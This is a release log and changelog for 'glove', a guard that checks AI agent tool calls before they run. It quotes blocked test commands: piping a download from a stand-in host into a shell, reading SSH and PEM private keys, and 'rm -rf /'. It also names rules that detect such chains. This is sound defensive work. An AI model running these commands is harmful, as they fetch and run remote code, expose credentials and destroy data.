# glove release log and summary

The single place to see where glove stands: what is shipped, what is planned, what each release proves, and how a release is cut. Per-release detail lives in `RELEASE/vX.Y.Z.md` (status, ACs mapped to named tests, built/limits); this file is the readable roll-up and the changelog.

> **Current state:** v0.4.0 ready (Layer 2 live against the real laya container; live Claude Code smoke check + tags pending the user). Statuses below are updated when a release changes state, in the same change as the code.

## 1. Summary

glove is a single-binary local guard for AI agent tool calls. Installed at the `PreToolUse` hook point of an agent (Claude Code first), it intercepts every tool invocation before execution, makes a three-way decision — allow / review / block — and writes an immutable audit record. The engine is layered and the invariant that separates it from regex guardrails is: **the guard only ever tightens** — deterministic rules decide the catastrophes at zero latency, and the model can never downgrade them.

| Fact | Value |
|---|---|
| Language / runtime | Go 1.27.3 (`go.mod`, CI `GO_VERSION`, `golang:1.27-alpine` builder), single static binary `CGO_ENABLED=0` |
| Runtime external dependency | the laya container (`docker run -p 8080:8080 ghcr.io/teochenglim/laya`, ADR 3) for Layer 2 — optional; absent = deterministic layers, fail-closed (§3.2). Zero non-loopback network on the decision path (§3.3) |
| Releases planned | 7 (v0.1.0 → v1.0.0, PRD §7 — 0.3.0–0.9.0 consolidated to three releases: 0.3.0 audit+policy, 0.4.0 Laya, 0.5.0 adapter matrix, 0.6.0 hardening) |
| Requirements / ACs | PRD §7 acceptance bullets are the requirements (ids auto-derived as `PRD-<ver>-<n>` by `make ac-map`); v0.1.0: 5 ACs, each governed by ≥ 2 named tests |
| Licence | Apache-2.0 |
| Artifacts per tag | tarballs for linux and macOS on amd64 and arm64 (+ `.sha256`), multi-arch image on GHCR, GitHub Release with notes from `RELEASE/<tag>.md`. Windows artifacts join the matrix at v0.9.0 (PRD §8) |

### Locked dependency list

New dependency = a row here (pinned as resolved by `go get <pkg>@latest`) + a line in the release file that introduced it.

| Dependency | Version | Locked where | Since |
|---|---|---|---|
| github.com/spf13/cobra | v1.10.2 | go.mod / go.sum | scaffold (CLI framework, PRD §10.1) |
| github.com/BurntSushi/toml | v1.6.0 | go.mod / go.sum | v0.3.0 (policy.toml parsing with line-numbered errors) |
| gopkg.in/yaml.v3 | v3.0.1 | go.mod / go.sum | v0.1.0 (embedded builtin.yaml rules) |
| github.com/google/uuid | v1.6.0 | go.mod / go.sum | v0.1.0 (audit IDs) |
| github.com/inconshreveable/mousetrap | v1.1.0 | go.sum (cobra dep, windows) | scaffold |
| github.com/spf13/pflag | v1.0.9 | go.sum (cobra dep) | scaffold |

## 2. Release status

Newest first.

| Release | Theme | Status | ACs | Requirements covered |
|---|---|---|---|---|
| [v0.1.0](RELEASE/v0.1.0.md) | Claude Code + Layer 0 | ready | 5 (10 tests) | 5/5 (PRD-0.1.0-1…5) |
| [v0.2.0](RELEASE/v0.2.0.md) | Layer 1: chain splitting | ready | 4 (8 tests) | 4/4 (PRD-0.2.0-1…4) |
| [v0.3.0](RELEASE/v0.3.0.md) | Audit + policy | ready | 9 (18 tests) | 9/9 (PRD-0.3.0-1…9) |
| [v0.4.0](RELEASE/v0.4.0.md) | Layer 2: Laya + `serve` | ready | 6 (12 tests) | 6/6 (PRD-0.4.0-1…6, ADR 3) |
| v0.5.0 | Adapter matrix (kilo → codex/opencode → cursor/gemini/zed) | planned | - | - |
| v0.6.0 | Release candidate: hardening | planned | - | - |
| v1.0.0 | Production ready (stability marker) | planned | - | - |

## 3. How a release is cut

1. Write/refresh `RELEASE/vX.Y.Z.md` ACs **before** code (red tests first). One branch per version: `release/0.1.0`, `release/0.2.0`, … (PRD §10.2). No `0.X.0` merges until its predecessor is tagged.
2. Implement until `make check` is green — fmt-check, vet, ac-map, tests, version-check (CI runs exactly this). Add `make audit` before calling a release ready.
3. Tick the release gates; update this file (§2/§4/§5), `ROADMAP.md`, `AGENTS.md` and any ADR touched, in the same change.
4. Agent hands over a one-line commit message. **User** commits on `release/X.Y.Z`, then runs `make release VERSION=x.y.z`.
5. CI: gate (`make check`, tag == `VERSION`) → cross-compile build (linux/mac × amd64/arm64, `CGO_ENABLED=0`) → GitHub Release (notes = `RELEASE/<tag>.md`) + multi-arch image on GHCR; security scans run in parallel on every push.

Versioning: SemVer; `0.x` minors map one-to-one to the PRD §7 roadmap; patches are fixes with no AC change (short note in §4); no `0.X` merges until its predecessor is tagged; `1.0.0` freezes the `contract.Verdict`, CLI, `policy.toml` and audit JSONL schemas.

## 4. Changelog

Newest first. One paragraph per release: what shipped, what it proves.

### v0.3.0 — Audit + Policy (ready, untagged)

Every decision is now observable and tunable before intelligence lands. The audit log (`~/.local/share/glove/audit.jsonl`, 10 MB × 5 rotation) records every hook invocation with zero plaintext by default (SHA-256 input hash only; `--audit-verbose` adds redacted input) and answers `audit tail` / `audit query` / `audit export` in under 200ms on 10k records. The `policy.toml` engine (project > user > built-in; scalars override, pattern lists concatenate) extends hard-block/force-confirm/protected-path rules with nothing to restart — edits are enforced on the next tool call, and a change emits a `policy_reload` audit event. An invalid policy fails the hook closed with key-path errors (`policy validate` adds parser line numbers for syntax errors). This proves users can see and tune the Layer 0+1 false-positive rate in the wild before Laya arrives.

### v0.2.0 — Layer 1: chain splitting (ready, untagged)

The engine now understands command composition: a quote-aware splitter (`&&`, `||`, `;`, `|`, `&`, newlines, `$(…)` extraction) feeds segment-level Layer 0 evaluation plus new composition rules (`pipe_to_shell`, `curl_pipe_bash`, `eval_of_download`) over pipe pairs and shell invocations, combined worst-part-wins. `npm test && curl http://x | sh` decomposes and blocks; `ls; git status` sails through; `--explain` shows per-segment verdicts. The 50-case chain fixture splits at 100% (≥ 95% required); hook P95 on the compound payload stays within the 20ms budget. Behavior change vs 0.1.0: `curl|wget … | sh` is now a hard block, not a review.

### v0.1.0 — Claude Code + Layer 0 (ready, untagged)

Layer 0 shipped end to end: `glove check` for manual verdicts, `glove hook claude-code` for the live PreToolUse path (exit 0/2 per §6, fail-closed on internal errors), `glove install claude-code` (diff + backup + idempotency + two verification test calls), and `glove doctor --bench hook` enforcing the 15ms cold-start budget (measured 4.7ms median locally). The builtin rule set (Appendix B: 5 hard-block, 4 force-confirm, 5 protected-path globs) is embedded and compiled at startup. This proves the deterministic layer and the adapter abstraction hold before anything smarter lands.

## 5. Verified and unverified

| Area | Verified by | Not exercised / limits |
|---|---|---|
| Scaffold (2026-11-04) | `go build ./...`, `go test ./...` (contract freeze tests), `glove version` → `0.1.0`, `make check` green locally | Nothing in PRD §7 existed yet at scaffold time |
| v0.1.0 engine + CLI (2026-11-04, local macOS arm64) | `make check` + `make race` green; 10-case hook fixture set; AC tests 2×5; CLI transcript (block/allow/review, protected paths, PRD §2.2 ssh-config distinction); hook exit codes 0/2 + fail-closed on broken stdin; install flow in a throwaway HOME (diff, backup, idempotency, broken-JSON guard); `doctor --bench hook` median 4.7ms vs 15ms budget | **Live Claude Code session not exercised** (needs install on the user's machine — run before tagging); CI never ran on a tag; linux/windows builds unexercised; govulncheck not installed locally |
| v0.2.0 Layer 1 (2026-11-04, local macOS arm64) | `make check` + `make race` green; 50-case chain fixture 100% split accuracy + decisions; compound-payload demos (`npm test && curl \| sh` → block with pair findings, `sh -c "$(curl …)"` → eval_of_download, `cat ~/.ssh/id_rsa && ls` → block); subprocess cold-start P95 on the compound payload within 20ms; bench median ~5ms | Same live-session and tag-CI gaps as v0.1.0 (the v0.2.0 tag will be the first run of the fixed workflows: ac-map locale fix, doctor smoke fix, Semgrep registry packs) |
| Security fixes (2026-11-04, after the v0.2.0 main-push run) | Semgrep (5 registry packs + vendored) 0 findings locally after fixing the vendored rules YAML (colon-in-plain-scalar broke the file) and scoping go-command-injection off `internal/cli/doctor.go` (bench spawns glove itself); Trivy fs 0 and image 0 locally (debian 12.15 + gobinary clean) — the CI failures were DB-download flakiness, mitigated with an actions/cache step on `.cache/trivy` | The fix needs the next CI run on main to confirm (cache restore + packs in CI) |
| v0.3.0 audit + policy (2026-11-04, local macOS arm64) | `make check` + `make race` green with 18 AC tests; demo transcript: audit tail/query/export, policy validate (syntax error with line/caret), policy_reload event with source attribution, user-protected path blocking `cat ~/secrets/key.pem` (exit 2), `check --policy` project hard-block, doctor policy/audit lines; 20-command zero-plaintext fixture; 10k-query ≤ 200ms; rotation at real 10 MB scale | Live agent session still pending (user); Windows paths unit-tested only; multi-day audit accumulation unexercised |
| v0.4.0 Layer 2 (2026-11-04, local macOS arm64, real laya container) | `make check` + `make race` green; six ACs × 2 tests; live demo: gray-area exfil denied by the model (regex missed), Chinese exfil sentence blocked via the multilingual checkpoint, `rm -rf /` deny with laya concurring, `git status` → review (calibration flaw found and fixed during the demo), offline §3.2 escalation, audit questions populated; serve-path ≤ 150ms P95 (stub), fallback ≤ 5ms P95 in-process; semgrep 264 rules / 0 findings over the new code | Model wall time ~0.5–2s warm per call (outside the overhead gate, `[laya] hook_timeout_ms` default 5000); AC0.4.4 benchmark measures the deterministic layers on the purpose-built corpus (the semantic re-run needs the model in CI); the strace CI job first runs on the next push; live-session smoke checks still pending the user |
| Roadmap consolidation (2026-11-04) | PRD §7 rewritten: old 0.3.0–0.9.0 (7 releases) merged into 0.3.0 audit+policy, 0.4.0 Laya (unchanged), 0.5.0 adapter matrix, 0.6.0 hardening; `RELEASE/v0.3.0.md` ACs written before any code; `make ac-map` green against the rewritten PRD | - |
